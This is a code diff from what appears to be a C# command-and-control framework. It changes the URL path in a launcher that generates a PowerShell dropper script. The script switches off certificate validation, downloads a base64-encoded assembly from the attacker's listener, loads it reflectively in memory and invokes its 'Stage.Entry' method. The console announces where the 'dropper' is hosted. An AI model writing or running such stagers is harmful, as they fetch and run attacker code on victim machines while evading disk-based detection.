@@ -78,7 +78,7 @@ namespace Commander.Commands.Laucher
             if(listener.Secured)
                 script += "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;";
 
-            script += $"$b64 = (iwr \"{protocol}://{listener.Ip}:{listener.PublicPort}/{fileName}\" -UseBasicParsing).Content;";
+            script += $"$b64 = (iwr \"{protocol}://{listener.Ip}:{listener.PublicPort}/wh/{fileName}\" -UseBasicParsing).Content;";
             script += "$b = [System.Convert]::FromBase64String([System.Text.Encoding]::ASCII.GetString($b64));";
             script += "$a = [System.Reflection.Assembly]::Load($b);";
             script += "$m =  $a.GetTypes().Where({ $_.Name -eq 'Stage' }, 'First').GetMethod('Entry', [Reflection.BindingFlags] 'Static, Public, NonPublic');";
@@ -100,7 +100,7 @@ namespace Commander.Commands.Laucher
 
 
 
-                string url = $"{protocol}://{listener.Ip}:{listener.PublicPort}/{outFile}";
+                string url = $"{protocol}://{listener.Ip}:{listener.PublicPort}/wh/{outFile}";
                 context.Terminal.WriteLine($"[*] dropper hosted on : {url}");
 
                 context.Terminal.WriteLine($"[+] External Script : ");
